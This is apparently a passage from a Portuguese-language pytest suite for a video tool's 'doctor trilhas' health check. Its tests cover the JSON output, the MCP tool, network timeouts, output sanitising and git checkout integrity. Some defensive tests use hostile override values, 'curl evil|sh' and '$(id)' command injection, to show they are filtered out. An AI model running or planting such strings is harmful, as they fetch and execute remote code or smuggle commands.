    assert (instantanea(e.home), instantanea(e.tmp / "tools"), instantanea(e.data)) == antes


# --- the command: `doctor trilhas` and the row `trilhas` of `doctor all` ----------------------------------------------


def _json(capsys, *argv):
    rc, out, err = executa(["doctor", *argv, "--json"], capsys, main)
    return rc, json.loads(out), out, err


def test_doctor_trilhas_json_tem_o_schema_proprio(ambiente, capsys):
    rc, doc, out, err = _json(capsys, "trilhas")
    assert rc == 0 and doc["schema"] == SCHEMA and [t["name"] for t in doc["tracks"]] == TRILHAS
    assert "Traceback" not in out + err


def test_doctor_trilhas_texto_tem_cabecalho_e_uma_linha_por_trilha(ambiente, capsys):
    rc, out, err = executa(["doctor", "trilhas"], capsys, main)
    linhas = out.splitlines()
    assert linhas[0] == "simplicio-video doctor trilhas: warn", out
    for nome in TRILHAS:
        assert any(linha.lstrip().startswith(("ok", "warn", "fail")) and nome in linha for linha in linhas), nome
    assert any("fix:" in linha for linha in linhas)
    assert rc == 0


def test_doctor_trilhas_com_uma_instalacao_quebrada_sai_com_1(ambiente, capsys):
    _grava(ambiente.caixa.tmp / "tools" / "opencut", {"README.md": "x\n"})
    rc, out, err = executa(["doctor", "trilhas"], capsys, main)
    assert rc == 1 and out.splitlines()[0] == "simplicio-video doctor trilhas: fail"


def test_doctor_trilhas_online_pela_linha_de_comando(ambiente, monkeypatch, capsys):
    monta_saudavel(ambiente, monkeypatch)
    rede = _rede_em_dia()
    monkeypatch.setattr(tools_update, "live_io", lambda: rede.io())
    rc, doc, out, err = _json(capsys, "trilhas", "--online")
    assert rc == 0 and doc["online"] is True
    assert _trilha(doc, "opencut")["upstream"] is not None


def test_doctor_trilhas_sem_online_nao_escreve_nada(ambiente, capsys):
    e = ambiente.caixa
    antes = instantanea(e.home)
    executa(["doctor", "trilhas"], capsys, main)
    assert instantanea(e.home) == antes


def test_doctor_all_tem_uma_linha_trilhas_com_o_resumo(ambiente, capsys):
    rc, rel, out, err = _json(capsys)
    linhas = [c for c in rel["checks"] if c["name"] == "trilhas"]
    assert len(linhas) == 1, [c["name"] for c in rel["checks"]]
    row = linhas[0]
    assert row["status"] == "warn" and row["fix"] == "simplicio-video doctor trilhas"
    assert "0 de 12" in row["summary"]
    assert [t["name"] for t in row["detail"]["tracks"]] == TRILHAS
    assert rc == 0 and "Traceback" not in out + err


def test_doctor_all_com_trilha_quebrada_sai_com_1(ambiente, capsys):
    _grava(ambiente.caixa.tmp / "tools" / "opencut", {"README.md": "x\n"})
    rc, rel, out, err = _json(capsys)
    row = [c for c in rel["checks"] if c["name"] == "trilhas"][0]
    assert row["status"] == "fail" and rc == 1 and rel["status"] == "fail"


def test_doctor_all_com_as_trilhas_em_dia_e_ok(ambiente, monkeypatch, capsys):
    monta_saudavel(ambiente, monkeypatch)
    rc, rel, out, err = _json(capsys)
    row = [c for c in rel["checks"] if c["name"] == "trilhas"][0]
    assert row["status"] == "ok" and row["fix"] is None and "12 de 12" in row["summary"]


# --- the MCP tool video.doctor: the same command, read-only ------------------------------------------------------------


def test_video_doctor_do_mcp_aceita_trilhas(ambiente, capsys):
    res = mcp_server.video_doctor("trilhas")
    assert res["rc"] == 0 and res["result"]["schema"] == SCHEMA
    assert [t["name"] for t in res["result"]["tracks"]] == TRILHAS


def test_a_descricao_do_video_doctor_diz_que_cobre_as_trilhas():
    assert "trilhas" in mcp_server.DESC_video_doctor


# --- the second review (red first): the network, the git of a checkout, the values a person types, the text of the fixes -------


def test_leitura_da_rede_tem_limite_de_tempo_e_nao_pede_senha(monkeypatch):
    """The reads of the upstream (git ls-remote, npm view) are bounded in time and never ask for a password on the terminal."""
    chamadas = []

    def falso_run(argv, **kw):
        chamadas.append(kw)
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(tools_update.subprocess, "run", falso_run)
    tools_update._run_leitura(["git", "ls-remote", "https://exemplo.invalid/r", "HEAD"])
    kw = chamadas[0]
    assert 0 < kw["timeout"] <= 60
    assert kw["env"]["GIT_TERMINAL_PROMPT"] == "0" and kw["stdin"] == subprocess.DEVNULL


def test_consulta_da_rede_que_estoura_o_tempo_vira_aviso_e_nao_trava(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    rede = _rede_em_dia()

    def estoura(argv, cwd=None):
        raise subprocess.TimeoutExpired(argv, 20)

    io = tools_update.Io(network=True, run=rede.run, read=estoura, fetch_json=lambda url: rede.pypi,
                         now=lambda: 1700000000, which=lambda nome: f"/falso/{nome}")
    doc = dt.collect(online=True, io=io)
    up = _c(_trilha(doc, "opencut"), "upstream")
    assert up["status"] == "warn" and "não consegui consultar" in up["summary"]


VALORES_HOSTIS = ["abc1234\n  ok    FORGED ROW; curl evil|sh", "abc1234;$(id)", "tok3n-SECRETO-do-shell-123"]


@pytest.mark.parametrize("valor", VALORES_HOSTIS)
def test_override_que_nao_e_commit_nao_vira_linha_nem_fix_nem_json(ambiente, monkeypatch, valor):
    """SIMPLICIO_<NAME>_REF is typed by a person or a script: a value that is not a commit (or a version) is not used, is not
    echoed, and cannot forge a row, a fix or the JSON."""
    monta_saudavel(ambiente, monkeypatch)
    monkeypatch.setenv("SIMPLICIO_OPENCUT_REF", valor)
    doc = dt.collect()
    bruto = json.dumps(doc, ensure_ascii=False)
    assert "FORGED" not in bruto and "$(id)" not in bruto and "SECRETO" not in bruto
    track = _trilha(doc, "opencut")
    assert track["pin_source"] == "override-invalido" and _c(track, "pin")["status"] == "warn"
    assert not [linha for linha in dt.texto(doc).splitlines() if linha.startswith("  ok    FORGED")]


def test_override_de_npm_com_comando_no_valor_nao_chega_ao_fix(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    monkeypatch.setenv("SIMPLICIO_TINYFISH_REF", "0.50.1;$(id)")
    assert "$(id)" not in json.dumps(dt.collect(), ensure_ascii=False)


def test_saida_do_binario_sem_controles_e_com_limite(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    write_fake_tool(ambiente.caixa.bin, "tinyfish", "\x1b[2Jlixo" + "y" * 5000 + "\n")
    inst = _c(_trilha(dt.collect(), "tinyfish"), "instalada")
    assert "\x1b" not in inst["summary"] and len(inst["summary"]) <= 300


def test_excecao_de_uma_trilha_e_limitada_e_sem_controles(ambiente, monkeypatch):
    def explode(t, io):
        raise RuntimeError("a" * 250 + "\x1b[31m" + "b" * 5000)

    monkeypatch.setattr(dt, "_avalia", explode)
    track = _trilha(dt.collect(), "opencut")
    assert "a" * 250 in track["summary"] and "\x1b" not in track["summary"] and len(track["summary"]) <= 400


def test_erro_da_consulta_do_upstream_sem_controles_e_limitado(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    rede = _rede_em_dia()
    rede.explode[tools.get("opencut").source] = OSError("\x1b[31m" + "x" * 5000)
    doc = dt.collect(online=True, io=rede.io())
    up = _c(_trilha(doc, "opencut"), "upstream")
    assert "\x1b" not in up["summary"] and len(up["summary"]) <= 400


@pytest.mark.skipif(os.name == "nt", reason="symlinks need a privilege on Windows")
def test_link_pendurado_no_lugar_do_checkout_falha_e_manda_apagar_o_link(ambiente):
    pasta = ambiente.caixa.tmp / "tools" / "opencut"
    pasta.parent.mkdir(parents=True, exist_ok=True)
    pasta.symlink_to(ambiente.caixa.tmp / "nao-existe")
    c = _c(_trilha(dt.collect(), "opencut"), "instalada")
    assert c["status"] == "fail" and "apague o link" in c["fix"]


def test_sem_home_e_sem_tools_dir_o_doctor_diz_o_que_definir(ambiente, monkeypatch):
    for nome in ("HOME", "USERPROFILE", "SIMPLICIO_TOOLS_DIR"):
        monkeypatch.delenv(nome, raising=False)

    def sem_casa(cls):
        raise RuntimeError("Could not determine home directory.")

    monkeypatch.setattr(Path, "home", classmethod(sem_casa))
    c = _c(_trilha(dt.collect(), "opencut"), "instalada")
    assert c["status"] == "warn" and "SIMPLICIO_TOOLS_DIR" in c["fix"] and "HOME" in c["fix"]


def test_pasta_que_nao_e_o_topo_do_proprio_repositorio_falha(ambiente, monkeypatch):
    """A folder with an invalid .git inside another repository: git would answer with the parent's HEAD and its top."""
    monta_saudavel(ambiente, monkeypatch)
    pasta = ambiente.caixa.tmp / "tools" / "toonflow"
    (pasta / ".fake-toplevel").write_text(str(ambiente.caixa.tmp), encoding="utf-8")
    c = _c(_trilha(dt.collect(), "toonflow"), "instalada")
    assert c["status"] == "fail" and "toonflow clone" in c["fix"]


def test_head_que_nao_e_um_commit_existente_falha(ambiente, monkeypatch):
    monta_saudavel(ambiente, monkeypatch)
    pasta = ambiente.caixa.tmp / "tools" / "moneyprinter"
    (pasta / ".fake-sem-objeto").write_text("", encoding="utf-8")
    c = _c(_trilha(dt.collect(), "moneyprinter"), "instalada")
    assert c["status"] == "fail" and "moneyprinter clone" in c["fix"]


@pytest.mark.skipif(os.name == "nt", reason="aspas do cmd.exe seguem outra regra")
def test_caminho_com_espaco_sai_entre_aspas_no_comando(ambiente, monkeypatch):
    import shlex

    destino = ambiente.caixa.tmp / "com espaço" / "tools"
    monkeypatch.setenv("SIMPLICIO_TOOLS_DIR", str(destino))
    c = _c(_trilha(dt.collect(), "voicestudio"), "instalada")
    assert shlex.quote(str(destino / "voicestudio")) in c["fix"]


def test_yt_dlp_sem_placeholder_enganoso_e_diz_que_instala_na_primeira_vez(ambiente):
    c = _c(_trilha(dt.collect(), "yt-dlp"), "instalada")
    assert "<" not in c["fix"] and "primeira vez" in c["fix"] and "--autorizo" in c["fix"]


def test_a_doc_do_pacote_lista_os_campos_do_schema_e_o_cache_do_npm():
    texto = (Path(__file__).resolve().parents[2] / "docs" / "host" / "packaging.md").read_text(encoding="utf-8")
    campos = ("schema", "status", "online", "tracks", "name", "command", "installed", "version", "pin", "pin_source",
              "pin_registry", "pin_match", "upstream", "checks", "summary", "fix", "detail", "pin_only", "latest", "newer",
              "error", "override-invalido")
    faltam = [c for c in campos if f"`{c}`" not in texto]
    assert not faltam, faltam
    assert "cache do npm" in texto and "sai com 1" in texto


# --- real git (integration: the hermetic suite refuses git; these put the real one back) ----------------------------------

REAL_GIT = tools._git  # the hermetic fixture swaps tools._git for a refusal in every test: integration tests restore this one


def _git_de_verdade(pasta: Path, *args: str) -> str:
    real = shutil.which("git", path=_caixa.REAL_PATH)
    return subprocess.run([real, *args], cwd=pasta, check=True, capture_output=True, text=True).stdout.strip()


@pytest.fixture
def git_real(saude, monkeypatch):
    """The real git on the sealed PATH (a launcher), a commit identity, the real tools._git, the tools folder under tmp."""
    e = saude.caixa
    write_git_launcher(e.bin)
    monkeypatch.setenv("SIMPLICIO_TOOLS_DIR", str(e.tmp / "tools"))
    monkeypatch.setenv("VIDEO_USE_DIR", str(e.tmp / "video-use"))
    for nome in ("GIT_AUTHOR_NAME", "GIT_COMMITTER_NAME"):
        monkeypatch.setenv(nome, "teste")
    for nome in ("GIT_AUTHOR_EMAIL", "GIT_COMMITTER_EMAIL"):
        monkeypatch.setenv(nome, "teste@invalido.example")
    monkeypatch.setattr(tools, "_git", REAL_GIT)
    return e


def _repo_real(pasta: Path) -> None:
    pasta.mkdir(parents=True, exist_ok=True)
    (pasta / "package.json").write_text("{}\n", encoding="utf-8")
    _git_de_verdade(pasta, "init", "-q")
    _git_de_verdade(pasta, "add", "-A")
    _git_de_verdade(pasta, "commit", "-q", "-m", "falso")


@pytest.mark.integration
def test_integracao_checkout_real_no_commit_do_pin_fica_ok(git_real, monkeypatch):
    pasta = git_real.tmp / "tools" / "opencut"
    _repo_real(pasta)
    _fixa(monkeypatch, "opencut", _git_de_verdade(pasta, "rev-parse", "HEAD"))
    doc = dt.collect()
    assert _c(_trilha(doc, "opencut"), "instalada")["status"] == "ok"
    assert _c(_trilha(doc, "opencut"), "pin")["status"] == "ok"


@pytest.mark.integration
def test_integracao_git_invalido_dentro_de_outro_repositorio_falha(git_real, monkeypatch):
    """A folder whose .git is not a repository, inside one that is: git walks up and would read the parent's HEAD."""
    pai = git_real.tmp / "pai"
    pai.mkdir()
    (pai / "a.txt").write_text("x\n", encoding="utf-8")
    _git_de_verdade(pai, "init", "-q")
    _git_de_verdade(pai, "add", "-A")
    _git_de_verdade(pai, "commit", "-q", "-m", "pai")
    monkeypatch.setenv("SIMPLICIO_TOOLS_DIR", str(pai / "tools"))
    pasta = pai / "tools" / "opencut"
    pasta.mkdir(parents=True)
    (pasta / "package.json").write_text("{}\n", encoding="utf-8")
    (pasta / ".git").mkdir()
    assert _c(_trilha(dt.collect(), "opencut"), "instalada")["status"] == "fail"


@pytest.mark.integration
def test_integracao_head_corrompido_falha(git_real):
    pasta = git_real.tmp / "tools" / "opencut"
    _repo_real(pasta)
    (pasta / ".git" / "HEAD").write_text("lixo\n", encoding="utf-8")
    assert _c(_trilha(dt.collect(), "opencut"), "instalada")["status"] == "fail"


@pytest.mark.integration
def test_integracao_head_que_aponta_para_objeto_ausente_falha(git_real):
    pasta = git_real.tmp / "tools" / "opencut"
    _repo_real(pasta)
    (pasta / ".git" / "refs" / "heads" / "falso").write_text("1" * 40 + "\n", encoding="utf-8")
    (pasta / ".git" / "HEAD").write_text("ref: refs/heads/falso\n", encoding="utf-8")
    assert _c(_trilha(dt.collect(), "opencut"), "instalada")["status"] == "fail"
